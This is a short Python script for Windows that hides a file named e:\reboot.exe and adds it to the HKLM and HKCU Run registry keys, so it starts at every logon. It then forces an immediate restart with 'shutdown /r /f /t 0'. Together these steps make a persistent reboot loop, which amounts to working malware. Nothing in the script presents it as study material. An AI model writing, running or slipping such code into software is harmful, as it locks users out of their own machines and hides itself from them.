
import os


def msflink():
    cmd = "shutdown /r /f /t 0"
    os.popen(cmd)


def register():
    cmd = "attrib +S +H e:\\reboot.exe"
    os.popen(cmd)
    cmd = r"echo yes|reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v reb /d e:\reboot.exe"
    os.popen(cmd)
    cmd = r"echo yes|reg add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v reb /d e:\reboot.exe"
    os.popen(cmd)


def main():
    register()
    msflink()


if __name__ == '__main__':
    main()
